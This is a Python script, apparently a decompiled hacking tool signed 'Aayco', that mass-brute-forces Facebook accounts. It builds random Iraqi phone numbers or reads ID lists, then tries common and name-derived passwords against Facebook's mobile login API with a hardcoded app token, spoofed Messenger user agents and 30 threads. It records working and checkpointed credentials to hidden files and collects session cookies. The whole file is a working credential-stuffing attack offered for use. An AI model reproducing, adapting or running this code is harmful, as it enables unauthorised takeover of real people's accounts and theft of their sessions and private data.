# Dec by Aayco
# Python version: [3.12]
# Source timestamp: [28 - 06 - 2025] [21:12:11] (UTC)

" Power Is Not Given To You, Take It By Yourself "

B = '\x1b[1m'
FT = '\x1b[2m'
IC = '\x1b[3m'
LINE = '\x1b[4m'
K = '\x1b[0;30m'
RED = '\x1b[0;31m'
G = '\x1b[0;32m'
BROWN = '\x1b[0;33m'
B = '\x1b[0;34m'
P = '\x1b[0;35m'
C = '\x1b[0;36m'
L = '\x1b[0;37m'
D = '\x1b[1;30m'
L = '\x1b[1;31m'
GN = '\x1b[1;32m'
YOW = '\x1b[1;33m'
L = '\x1b[1;34m'
LI = '\x1b[1;35m'
LI = '\x1b[1;36m'
L = '\x1b[1;37m'
B = '\x1b[1m'
F = '\x1b[2m'
I = '\x1b[3m'
U = '\x1b[4m'
N = '\x1b[7m'
CR = '\x1b[9m'
E = '\x1b[0m'
import os
import time
import sys
import requests
import random
import json
import subprocess
from datetime import datetime
from names import get_first_name
from user_agent import generate_user_agent
from colorama import Fore
users = ['Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2', 'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPad', 'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8J2', 'Mozilla/5.0 (iPad; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A5313e Safari/7534.48.3', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148 Twitter for iPhone', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 Twitter for iPhone', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8C148', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5', 'Mozilla/5.0 (iPad; U; CPU OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8H7', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5', 'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Mobile/8A306', 'Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A5313e Twitter for iPhone', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5', 'Mozilla/5.0 (iPad; U; CPU OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5', 'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5']
uas = ['Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/518.0.0.66.86;IABMV/1;] FBNV/5', 'Mozilla/5.0 (Linux; Android 15; SM-S938U Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/518.0.0.66.86;IABMV/1;]', 'Mozilla/5.0 (Linux; Android 15; SM-S938U1 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/518.0.0.66.86;IABMV/1;]\tAndroid', 'Mozilla/5.0 (Linux; Android 15; SM-S938U Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/518.0.0.66.86;IABMV/1;] FBNV/5']
uagen = []
for _ in range(10000):
    dft = random.choice(users)
    uagen.append(dft)
uagen23 = []
for _ in range(10000):
    df = random.choice(uas)
    uagen23.append(df)
try:
    import os
    import time
    import sys
    import requests
    import random
    import json
    import subprocess
    from datetime import datetime
    from names import get_first_name
    from user_agent import generate_user_agent
    from colorama import Fore
    from colorama import Fore
    from datetime import datetime
    from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
    os.system('pip install requests ')
    os.system('pip install names')
    os.system('pip install generate_user_agent ')
    os.system('pip install colorama')
    os.system('pip install Fore')
import os, subprocess, requests, random, sys, time, json
BLACK = '\x1b[0;30m'
RED = '\x1b[0;31m'
GREEN = '\x1b[0;32m'
BROWN = '\x1b[0;33m'
BLUE = '\x1b[0;34m'
LIGHT_GREEN = '\x1b[1;32m'
YELLOW = '\x1b[1;33m'
LIGHT_BLUE = '\x1b[1;34m'
LIGHT_PURPLE = '\x1b[1;35m'
LIGHT_CYAN = '\x1b[1;36m'
PURPLE = '\x1b[0;35m'
CYAN = '\x1b[0;36m'
LIGHT_GRAY = '\x1b[0;37m'
DARK_GRAY = '\x1b[1;30m'
LIGHT_RED = '\x1b[1;31m'
LIGHT_WHITE = '\x1b[1;37m'
BOLD = '\x1b[1m'
FAINT = '\x1b[2m'
ITALIC = '\x1b[3m'
UNDERLINE = '\x1b[4m'
NEGATIVE = '\x1b[7m'
CROSSED = '\x1b[9m'
END = '\x1b[0m'
PURPLE = '\x1b[0;35m'
CYAN = '\x1b[0;36m'
LIGHT_GRAY = '\x1b[0;37m'
DARK_GRAY = '\x1b[1;30m'
LIGHT_RED = '\x1b[1;31m'
BOLD = '\x1b[1m'
FAINT = '\x1b[2m'
ITALIC = '\x1b[3m'
UNDERLINE = '\x1b[4m'
NEGATIVE = '\x1b[7m'
ok, cp, loop = (0, 0, 0)

""" Just An Useless Shit XD """

#current = '2025-06-30 12:00:00.10'
#dfrt = datetime.now()
#if str(dfrt) >= current:
#    print('')
#    print('STOPED SERVER ')
#    exit()
#else:
#    kil += 1
#os.system('xdg-open https://t.me/wetdevs')
#try:
#    os.system('espeak -a 300 "WELCOME TO TOOL"')
#except:
#    os.system('pkg install espeak')
#    os.system('espeak -a 300 "WELCOME TO TOOL"')
LISTPASS = ['dyar1234', 'hamar1234', 'hama1234', 'muhammad123', 'muhamad123', 'zaxo1234', '12345678', '11223344', '1122334455', '12341234', '123456789', 'ahmad1234', 'jalal1234', 'king1234', 'kurdkurd', 'kurd1234', 'kurdstan123', 'hama1234512345678', '123456', '123456789', 'hama123', 'hama1234', 'hama12345', 'hama123456', 'ahmad123', 'ahmad1234', 'ahmad123456', 'muhamad123', 'muhamad1234', 'muhamad12345', 'muhamad123456', 'zaxo123', 'zaxozaxo', 'zaxo1234', 'kurdkurd', 'kurd1234', 'kurdistan123', 'kurdistan12345', 'dyar123', 'dyar1234', 'dyary1234', 'dyary123']

def okf(uid, pas):
    with open('.OKS.txt', 'a') as okd:
        okd.write('OK - ' + str(uid) + '|' + str(pas) + '\n')

def cpf(uid, pas):
    oswq = open('.CPS.txt', 'a')
    oswq.write('CP - ' + str(uid) + '|' + str(pas) + '\n')

def checkok(TELL):
    banner()
    try:
        print('TOTALL OK')
        for sdf in open('.OKS.txt', 'r').readlines():
            print(sdf.strip())
        print(f'{Fore.WHITE}_' * 50)
        exit()
    except Exception:
        print('NOT OK IDZ ! ')
        exit()

def checkcp(TELL):
    banner()
    try:
        print('TOTALL CP')
        q = open('.CPS.txt', 'r')
        for tyu in q:
            print(tyu.strip())
        print(f'{Fore.WHITE}_' * 50)
        exit()
    except Exception:
        print('NOT CP IDZ ! ')

def banner2():
    print(Fore.BLUE + '[×]' + Fore.GREEN + ' [(1)] CRACK FILE 🦅')
    print(Fore.BLUE + '[×]' + Fore.GREEN + ' [(2)] CRACK RANDOM NUMBER FOR SIM ')
    print(Fore.BLUE + '[×]' + Fore.GREEN + ' [(3)] CHECK (OK) ')
    print(Fore.BLUE + '[×]' + Fore.GREEN + ' [(4)] CHECK (CP)')
    print(Fore.BLUE + '[×]' + Fore.GREEN + ' [(5)] CRACK RANDOM ID NUMBER (AUTO PASSWORD)')
    print(Fore.BLUE + '[×]' + Fore.GREEN + ' [(6)] CRACK RANDOM ID NUMBER (YOUR PASSWORD)')
    print(f'{Fore.BLUE}[×] {Fore.GREEN}[(0)] EXIT ! ')
    print(f'{Fore.BLUE}[×]{Fore.WHITE}____________________________________{Fore.BLUE}[×]')

def banner():
    os.system('clear')
    log = f'\n{Fore.YELLOW}\n░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░       ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ \n░▒▓████████▓▒░▒▓████████▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░  \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░     \n{Fore.CYAN}                                                      \n                                                      \n░▒▓███████▓▒░░▒▓████████▓▒░▒▓████████▓▒░              \n░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░              \n░▒▓█▓▒░░▒▓█▓▒░    ░▒▓██▓▒░     ░▒▓██▓▒░               \n░▒▓█▓▒░░▒▓█▓▒░  ░▒▓██▓▒░     ░▒▓██▓▒░                 \n░▒▓█▓▒░░▒▓█▓▒░░▒▓██▓▒░     ░▒▓██▓▒░                   \n░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░                     \n░▒▓███████▓▒░░▒▓████████▓▒░▒▓████████▓▒░'
    print(log)
    print(Fore.WHITE + '_' * 50)

def mainchoose():
    banner()
    banner2()
    TELL = input(f'{Fore.RED}CHOOSE: ')
    if TELL in ['1']:
        crackFILE(TELL)
    elif TELL in ['2']:
        rndsim(TELL)
    elif TELL in ['3']:
        checkok(TELL)
    elif TELL in ['4']:
        checkcp(TELL)
    elif TELL in ['5']:
        autt(TELL)
    elif TELL in ['6']:
        your(TELL)
    elif TELL in ['0']:
        os.system('clear')
        exit('BYYYYYYY')
    else:
        mainchoose()

def crackFILE(TELL):
    banner()
    idas = []
    filew = input('FILE PATH: ')
    try:
        for werty in open(filew).readlines():
            idas.append(werty.strip())
    except FileNotFoundError:
        print('FILE ERROR 🤮')
        time.sleep(1)
        crackFILE(TELL)
    setting(idas, TELL)

def setting(idas, TELL):
    banner()
    tlg = str(len(idas))
    da = datetime.now()
    print(f'DATA - {da} ')
    print(f'YOUR SELCET - {TELL} ')
    print(f'CRACK IDZ FOR OK OR CP ACCOUNT ')
    print('_' * 50)
    with tred(max_workers=30) as ahad:
        for usa in idas:
            ids = usa.split('|')[0]
            pd = usa.split('|')[1]
            frs = pd.split(' ')[0]
            pasqwde = [pd, frs, frs + '123', frs + '123123', frs + '1234', frs + '12345', frs + '123456', frs + '12', frs + '12345678']
            ahad.submit(rndm, ids, pasqwde, tlg)
    input(f'{Fore.YELLOW}CRACK HAS BIN COMPLETED...! ')

def autt(TELL):
    banner()
    fib = []
    fd = ['0750', '0780']
    simew = random.choice(fd)
    tlg = '100000'
    for sdf in range(100000):
        nm = random.randint(0, 9999999)
        fib.append(nm)
    da = datetime.now()
    print(f'DATA - {da} ')
    print(f'YOUR SELCET - {TELL} ')
    print(f'CRACK IDZ FOR OK OR CP ACCOUNT ')
    print('_' * 50)
    with tred(max_workers=30) as der:
        for tyt in fib:
            ids = '+964' + simew + str(tyt)
            pasqwde = [str(tyt), simew + str(tyt), 'dyar1234', 'hamar1234', 'hama1234', 'muhammad123', 'muhamad123', 'zaxo1234', '12345678', '11223344', '1122334455', '12341234', '123456789', 'ahmad1234', 'muhamad1234', 'king1234', 'kurdkurd', 'kurd1234', 'kurdstan123', 'hama12345']
            der.submit(rndm, ids, pasqwde, tlg)
    input(f'{Fore.YELLOW}CRACK HAS BIN COMPLETED...! ')

def your(TELL):
    banner()
    fib = []
    pasqwde = []
    fd = ['0750', '0780']
    simew = random.choice(fd)
    tlg = '100000'
    lime = input('HOW MANY LIMIT PASSWORD: ')
    for pw in range(int(lime)):
        dar = input(f'{Fore.GREEN}ENTER YOUR PASSWORD[{pw + 1}]: ')
        pasqwde.append(dar)
    banner()
    for sdf in range(100000):
        nm = random.randint(0, 9999999)
        fib.append(nm)
    da = datetime.now()
    print(f'DATA - {da} ')
    print(f'YOUR SELCET - {TELL} ')
    print(f'CRACK IDZ FOR OK OR CP ACCOUNT ')
    print('_' * 50)
    with tred(max_workers=30) as der:
        for tyt in fib:
            ids = '+964' + simew + str(tyt)
            der.submit(rndm, ids, pasqwde, tlg)
    input(f'{Fore.YELLOW}CRACK HAS BIN COMPLETED...! ')

def rndsim(TELL):
    banner()
    fi = []
    print(f'{Fore.YELLOW}0750 : 0780 : 0770 : 0751 : 0781 : 0771 ')
    sims = input(f'{Fore.CYAN}SELCET: ')
    banner()
    tlg = '100000'
    for w in range(100000):
        nu = random.randint(0, 9999999)
        fi.append(nu)
    da = datetime.now()
    print(f'DATA - {da} ')
    print(f'YOUR SELCET - {TELL} ')
    print(f'CRACK IDZ FOR OK OR CP ACCOUNT ')
    print('_' * 50)
    with tred(max_workers=30) as w:
        for us in fi:
            ids = '+964' + sims + str(us)
            pasqwde = [str(us), sims + str(us)]
            w.submit(rndm, ids, pasqwde, tlg)
    input(f'{Fore.YELLOW}CRACK HAS BIN COMPLETED...! ')

def rndm(ids, pasqwde, tlg):
    try:
        global ok, loop, cp
        sys.stdout.write(f'\r\r\r{Fore.WHITE}[Aayco-🦅]{Fore.GREEN} └─➤{Fore.WHITE}{tlg}{Fore.GREEN} └─➤{Fore.BLUE}{loop} {Fore.GREEN}└─➤OK - {ok} └─➤{Fore.YELLOW}CP - {cp} ')
        sys.stdout.flush()
        for pas in pasqwde:
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(111111111, 999999999))
            android_version = subprocess.check_output('getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
            model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
            build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
            fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
            fbbd = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
            ua = 'Dalvik/2.1.0 (Linux; U; Android ' + android_version + '; ' + model + ' Build/' + build + ') [FBAN/Orca-Android;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBDV/' + model + ';FBSV/' + android_version + ';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=' + str(random.randint(1, 9)) + '.' + str(random.randint(1, 9)) + ',width=' + str(random.randint(500, 999)) + ',height=' + str(random.randint(999, 1999)) + '};FB_FW/1;]'
            data = {'locale': 'en_GB', 'format': 'json', 'email': ids, 'password': pas, 'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28', 'generate_session_cookies': 1}
            head = {'user-agent': ua, 'Host': 'graph.facebook.com', 'Content-Type': 'application/json;charset=utf-8', 'Content-Length': '595', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
            po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
            if 'session_key' in po:
                uid = po['uid']
                coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
                print(f'\r\r{Fore.WHITE}[Aayco-{Fore.GREEN}OK{Fore.WHITE}]{Fore.GREEN} {uid} | {pas}               ')
                os.system('espeak -a 300 "OK ACCOUNT "')
                okf(uid, pas)
                ok += 1
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = po['error']['error_data']['uid']
                print(f'\r\r{Fore.WHITE}[Aayco-{Fore.YELLOW}CP{Fore.WHITE}]{Fore.YELLOW} {uid} | {pas}               ')
                os.system('espeak -a 300 "CP ACCOUNT "')
                cpf(uid, pas)
                cp += 1
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
    except Exception as e:
        pass
mainchoose()
